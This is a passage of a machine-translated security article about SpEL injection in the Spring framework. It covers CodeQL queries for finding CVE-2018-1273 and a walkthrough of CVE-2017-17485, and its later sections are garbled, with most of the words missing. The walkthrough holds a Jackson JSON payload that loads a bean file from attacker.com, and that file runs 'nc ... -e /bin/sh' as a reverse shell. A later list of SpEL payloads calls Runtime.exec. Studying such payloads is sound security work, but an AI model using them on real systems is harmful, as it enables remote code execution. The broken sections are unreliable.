l'appel est consid√©r√© comme vuln√©rable.  Pour nous, c'est n'importe quelle classe qui contient une m√©thode qui appelle ExpressionParser. </p><br><p>  Ensuite, nous faisons une s√©lection de toutes les m√©thodes qui r√©pondent √† nos exigences, par exemple, en d√©crivant l'occurrence d'une variable dans une m√©thode qui assainirait et la condition de ne pas tomber dans cette m√©thode. </p><br><p><img src="https://habrastorage.org/webt/or/cs/bu/orcsbusthzp51u1y_l0wuupohe8.png"></p><br><p>  Alors, que faut-il faire pour trouver la vuln√©rabilit√© CVE 2018-1273? <br>  Apr√®s avoir re√ßu et connect√© l'image du projet, nous utilisons la console QL pour d√©crire l'arborescence d'appels qui nous int√©resse.  Pour ce faire: <br>  Nous d√©crivons la classe de l'analyseur d'expression: </p><br><pre> <code class="java hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">ExpressionParser</span></span></span><span class="hljs-class"> </span><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">extends</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">RefType</span></span></span><span class="hljs-class"> </span></span>{ ExpressionParser() { <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.hasQualifiedName(<span class="hljs-string"><span class="hljs-string">"org.springframework.expression"</span></span>, <span class="hljs-string"><span class="hljs-string">"ExpressionParser"</span></span>) } }</code> </pre> <br><p>  Et les m√©thodes qui peuvent √™tre utilis√©es pour l'ex√©cution dans la classe ExpressionParser: </p><br><pre> <code class="java hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">ParseExpression</span></span></span><span class="hljs-class"> </span><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">extends</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">MethodAccess</span></span></span><span class="hljs-class"> </span></span>{ ParseExpression() { exists (Method m | (m.getName().matches(<span class="hljs-string"><span class="hljs-string">"parse%"</span></span>) or m.hasName(<span class="hljs-string"><span class="hljs-string">"doParseExpression"</span></span>)) and <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.getMethod() = m ) } }</code> </pre> <br><p>  Vous devez maintenant connecter ces descriptions entre elles et faire une s√©lection: </p><br><pre> <code class="sql hljs">from ParseExpression expr where (expr.getQualifier().getType().(RefType).getASupertype*() instanceof ExpressionParser) <span class="hljs-keyword"><span class="hljs-keyword">select</span></span> expr</code> </pre> <br><p>  Une telle requ√™te renverra toutes les m√©thodes commen√ßant par parse ou avec le nom doParseExpression qui appartiendront √† la classe ExpressionParser.  Mais c'est trop, dites-vous, et vous aurez raison.  Un filtre est requis. </p><br><p>  Parce que  dans le code il y a un commentaire du formulaire: </p><br><pre> <code class="sql hljs">* Converts a patch path to an {@link Expression}. * * @param path the patch path to convert.</code> </pre> <br><p>  Cela pourrait √™tre, par exemple, une recherche de ¬´chemin¬ª dans Javadoc.  Spring commente son code dans une tr√®s haute qualit√©, et nous pouvons trouver des appels de m√©thode avec le commentaire n√©cessaire, et en m√™me temps supprimer toutes les m√©thodes incluses dans les tests.  Tout cela peut √™tre d√©crit comme suit: </p><br><pre> <code class="java hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">CallHasPath</span></span></span><span class="hljs-class"> </span><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">extends</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">Callable</span></span></span><span class="hljs-class"> </span></span>{ CallHasPath() { not <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.getDeclaringType() <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">instanceof</span></span></span><span class="hljs-function"> TestClass </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">and</span></span></span><span class="hljs-function"> </span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">( </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">this</span></span></span></span><span class="hljs-function"><span class="hljs-params">.getDoc()</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">getJavadoc</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">instanceof</span></span></span><span class="hljs-function"> DocHasPath or </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">this</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">getDeclaringType</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">getDoc</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">getJavadoc</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">instanceof</span></span></span><span class="hljs-function"> DocHasPath ) } }</span></span></code> </pre> <br><p>  Ensuite, pour combiner la classe, les m√©thodes et le filtre par Javadoc, la requ√™te pour la s√©lection prendra la forme suivante: </p><br><pre> <code class="sql hljs">from ParseExpression expr, CallHasPath c where (expr.getQualifier().getType().(RefType).getASupertype*() instanceof ExpressionParser and c = expr.getEnclosingCallable()) <span class="hljs-keyword"><span class="hljs-keyword">select</span></span> expr, c</code> </pre> <br><p>  Cet exemple peut √™tre consid√©r√© comme simple et, en g√©n√©ral, redondant pour rechercher une vuln√©rabilit√© sp√©cifique.  La recherche d'erreurs lors de l'√©criture d'un correctif est beaucoup plus int√©ressante, car  vous devez sp√©cifier la classe elle-m√™me, qui est responsable de la v√©rification, les m√©thodes qui l'appellent toujours et qui sont ex√©cut√©es avant d'√™tre v√©rifi√©es. </p><br><p>  Un appel √† une m√©thode qui appelle toujours verifyPath: </p><br><pre> <code class="java hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">VerifyPathCallerAccess</span></span></span><span class="hljs-class"> </span><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">extends</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">MethodAccess</span></span></span><span class="hljs-class"> </span></span>{ VerifyPathCallerAccess() { exists(VerifyPathActionConf conf | conf.callAlwaysPerformsAction(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>) ) or <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.getMethod() <span class="hljs-keyword"><span class="hljs-keyword">instanceof</span></span> VerifyPath } }</code> </pre> <br><p>  Un appel √† une m√©thode qui s'ex√©cute avant verifyPath: </p><br><pre> <code class="java hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">UnsafeEvaluateCall</span></span></span><span class="hljs-class"> </span><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">extends</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">MethodAccess</span></span></span><span class="hljs-class"> </span></span>{ UnsafeEvaluateCall() { ( <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.getMethod() <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">instanceof</span></span></span><span class="hljs-function"> Evaluate or </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">exists</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(UnsafeEvaluateCall unsafe | </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">this</span></span></span></span><span class="hljs-function"><span class="hljs-params">.getMethod()</span></span></span><span class="hljs-function"> </span></span>= unsafe.getEnclosingCallable() ) ) <span class="hljs-function"><span class="hljs-function">and not </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">exists</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(VerifyPathCallerAccess verify | dominates(verify, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">this</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function"> ) } }</span></span></code> </pre> <br><p>  Prenons une autre vuln√©rabilit√© int√©ressante.  Sa compr√©hension est tr√®s importante, car  il montre que l'erreur peut se trouver dans une biblioth√®que tierce et montre comment les beans annot√©s XML peuvent √™tre utilis√©s. </p><br><h2 id="jackson-and-bean">  Jackson et haricot </h2><br><p>  CVE-2017-17485 est bas√© sur l'utilisation de FileSystemXmlApplicationContext - il s'agit d'un contexte d'application autonome sous forme de XML, qui re√ßoit des fichiers de d√©finition de contexte du syst√®me de fichiers ou de l'URL. </p><br><p>  Selon la documentation, cela vous permet de charger des beans √† partir d'un fichier et de recharger le contexte de l'application. <br>  "... Cr√©er un nouveau FileSystemXmlApplicationContext, en chargeant les d√©finitions √† partir des fichiers XML donn√©s et en actualisant automatiquement le contexte" </p><br><p>  Jackson est une biblioth√®que qui vous permet de s√©rialiser et de d√©s√©rialiser tous les objets √† l'exception de ceux qui sont sur liste noire.  Cette opportunit√© est souvent utilis√©e par les attaquants.  Dans le cas de cette vuln√©rabilit√©, l'attaquant devait transmettre l'objet <code>org.springframework.context.support.FileSystemXmlApplicationContext</code> avec une valeur contenant le chemin d'acc√®s au fichier contr√¥l√© par l'attaquant. </p><br><p>  C'est-√†-dire  dans le corps de la requ√™te, vous pouvez transmettre le JSON suivant: </p><br><pre> <code class="json hljs">{<span class="hljs-attr"><span class="hljs-attr">"id"</span></span>:<span class="hljs-number"><span class="hljs-number">123</span></span>, <span class="hljs-attr"><span class="hljs-attr">"obj"</span></span>: [<span class="hljs-string"><span class="hljs-string">"org.springframework.context.support.FileSystemXmlApplicationContext"</span></span>, <span class="hljs-string"><span class="hljs-string">"https://attacker.com/spel.xml"</span></span>]}</code> </pre> <br><p>  Spel.xml contiendra les param√®tres bin: </p><br><pre> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">beans</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xmlns</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://www.springframework.org/schema/beans"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xmlns:xsi</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xsi:schemaLocation</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">bean</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">id</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"pb"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">class</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"java.lang.ProcessBuilder"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">constructor-arg</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">list</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value-type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"java.lang.String"</span></span></span><span class="hljs-tag"> &gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span>nc<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span>XXXX<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span>9999<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span>-e<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span>/bin/sh<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">list</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">constructor-arg</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">property</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"whatever"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"#{pb.start()}"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">bean</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">beans</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><p>  Parce que  Puisque nous avons utilis√© la classe de bean java.lang.ProcessBuilder, qui a une m√©thode de d√©marrage, apr√®s avoir recharg√© le contexte, Spring lit l'expression qui d√©marre ProcessBuilder √† partir de la propri√©t√© SpEL, for√ßant ainsi le serveur √† se connecter √† nous √† l'aide de nc. </p><br><p>  Il convient de pr√™ter attention au spel.xml donn√© √† titre d'exemple, comme  il montre comment passer des param√®tres lors de l'ex√©cution de la commande. </p><br><p>  Et de quelle autre mani√®re pouvons-nous charger notre bean ou recharger le contexte? </p><br><p>  M√™me avec un rapide coup d'≈ìil √† la documentation Spring, vous pouvez trouver quelques autres classes qui pourraient nous √™tre utiles. </p><br><p>  ClassPathXmlApplicationContext et AbstractXmlApplicationContext sont similaires √† FileSystem, mais les beans annot√©s ClassPath et XML sont utilis√©s comme chemin d'acc√®s √† la configuration, respectivement. </p><br><p>  Il y a un autre point int√©ressant li√© au rechargement du contexte - @RefreshScope. </p><br><p>  Tout Spring Bean annot√© avec @RefreshScope sera mis √† jour au moment du lancement.  Et tous les composants qui l'utilisent recevront un nouvel objet la prochaine fois que la m√©thode sera appel√©e, ils seront enti√®rement initialis√©s et introduits en fonction. </p><br><p>  RefreshScope est un composant en contexte, et il a une m√©thode publique refreshAll con√ßue pour mettre √† jour tous les composants dans une zone en effa√ßant le cache cible.  Par cons√©quent, lors de l'utilisation de @RefreshScope, l'utilisateur peut acc√©der √† une URL se terminant par / refresh, et ainsi recharger les beans annot√©s. </p><br><h2 id="drugie-utility">  Autres utilitaires </h2><br><p>  Il existe de nombreux autres plugins et programmes qui vous permettent d'analyser le code et de trouver la vuln√©rabilit√©. </p><br><ul><li>  Jprofiler - est install√© comme une application distincte - serveur et plugin pour IDE.  Vous permet d'analyser une application en cours d'ex√©cution.  Il est tr√®s pratique d'analyser le comportement des objets √† l'aide de graphiques. </li></ul><br><p><img src="https://habrastorage.org/webt/g4/ki/ij/g4kiijoeylzhjo742es00a_ksti.png"></p><br><p>  Parmi les inconv√©nients - pay√©s, mais a une p√©riode libre de 10 jours.  Il est consid√©r√© comme l'un des meilleurs utilitaires pour analyser le comportement des applications, non seulement du point de vue de la s√©curit√©. </p><br><ul><li>  Xrebel - pay√©, nous n'avons pas trouv√© la possibilit√© d'une p√©riode d'essai.  Mais aussi consid√©r√© comme l'un des meilleurs. </li><li>  Coverity - utilise ses propres serveurs pour l'analyse, il n'est donc pratique que pour ceux qui n'ont pas peur de pr√©senter leur code. </li><li>  Checkmarx - tr√®s c√©l√®bre, pay√©, conna√Æt de nombreuses langues et supprime beaucoup de faux positifs.  Mais il vaut mieux pointer l'endroit o√π la th√©orie peut avoir une erreur que de manquer une vraie erreur. </li><li>  OWASP Dependency Check - fourni comme un plug-in pratique pour divers constructeurs.  Nous avons r√©ussi √† le tester pour Maven et Ant lors de l'analyse d'une application Java.  Prend √©galement en charge .Net.  Selon les r√©sultats des travaux, il fournit un rapport pratique indiquant les biblioth√®ques obsol√®tes et les vuln√©rabilit√©s qui leur sont connues. </li><li>  Findbugs - il a d√©j√† √©t√© mentionn√© plus t√¥t.  Il a de nombreuses impl√©mentations, mais l'option findbugs_cli s'est av√©r√©e la plus pratique et, pour une raison quelconque, pr√©sente plus de probl√®mes.  Il peut √™tre utilis√© comme suit: <br><pre> <code class="bash hljs">findsecbugs.bat -progress -html -output report_name.htm <span class="hljs-string"><span class="hljs-string">"path\example.jar"</span></span></code> </pre> </li><li>  LGTM QL - Un exemple de son utilisation a d√©j√† √©t√© donn√© pr√©c√©demment.  Nous tenons √† dire s√©par√©ment qu'il existe √©galement un cas d'utilisation payant, apr√®s quoi vous recevrez un serveur local pour analyser votre code. <br> QL    Java,             . </li></ul><br><h1 id="black-box"> Black Box </h1><br><p>  -,   . <br>  ,    : Spring,     SpEL, ,  SpEL API,   -,        . </p><br><p>         spring,      URL,    API.        /metrics  /beans ‚Äî     Spring Boot Actuator     ,        . </p><br><p>  ,    . </p><br><p>    , SpEL      ,     ,    . </p><br><ul><li>  : <code>var[SpEL]=123</code> </li><li>  : <code>&amp;variable1=123&amp;SpEL=</code> </li><li> : org.springframework.cookie = <code>${}</code> </li><li>     .. </li></ul><br><h2 id="vot-nebolshaya-podborka-s-variantami-peylodov">      : </h2><br><pre> <code class="javascript hljs">${<span class="hljs-number"><span class="hljs-number">1</span></span>+<span class="hljs-number"><span class="hljs-number">3</span></span>} T(java.lang.Runtime).getRuntime().exec(<span class="hljs-string"><span class="hljs-string">"nslookup !url!"</span></span>) #<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.getClass().forName(<span class="hljs-string"><span class="hljs-string">'java.lang.Runtime'</span></span>).getRuntime().exec(<span class="hljs-string"><span class="hljs-string">'nslookup !url!'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> java.lang.ProcessBuilder({<span class="hljs-string"><span class="hljs-string">'nslookup !url!'</span></span>}).start() ${user.name}</code> </pre> <br><h1 id="ne-spelom-ediny">  SpEL  </h1><br><p>    SpEL    ,   ,     EL Injection.    : OGNL, MVEL, JBoss EL, JSP EL.   -        . </p><br><h1 id="v-kachestve-zaklyucheniya">    </h1><br><p>  ZeroNights  : ‚Äú ,  Spring,   SpEL injection?‚Äù </p><br><p>   ,    CVE,   .       ,     ,   github. </p><br><p>  ,   ,            SpEL Expression.  C'est-√†-dire  (,   )        ,      . </p><br><p>  C'est-√†-dire            .      ,          ,       ‚Äú‚Äù . </p></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/fr433034/">https://habr.com/ru/post/fr433034/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr433014/index.html">Blagues sur la r√©cente lib√©ration d'astronautes dans l'espace</a></li>
<li><a href="../fr433016/index.html">Changements d'interface, animation en couches et chaos visuel structur√©: un examen des tendances Web pour 2019</a></li>
<li><a href="../fr433018/index.html">UDB. Qu'est-ce que c'est? Partie 2. Chemin de donn√©es</a></li>
<li><a href="../fr433030/index.html">Live: performances frontales</a></li>
<li><a href="../fr433032/index.html">Comment fonctionne le routage m√©dical - nous en parlons sur l'exemple de l'application DOC +</a></li>
<li><a href="../fr433036/index.html">Conseils pour organiser l'informatique dans une petite entreprise</a></li>
<li><a href="../fr433038/index.html">Pourquoi les sp√©cialistes du marketing apprennent-ils la programmation</a></li>
<li><a href="../fr433042/index.html">Intel sortira le processeur avec une architecture tridimensionnelle Foveros en 2019</a></li>
<li><a href="../fr433044/index.html">Le code source d'OpenJDK contient trop de jurons</a></li>
<li><a href="../fr433046/index.html">Toute la v√©rit√© sur RTOS. Article # 25. Canaux de donn√©es: introduction et services de base</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>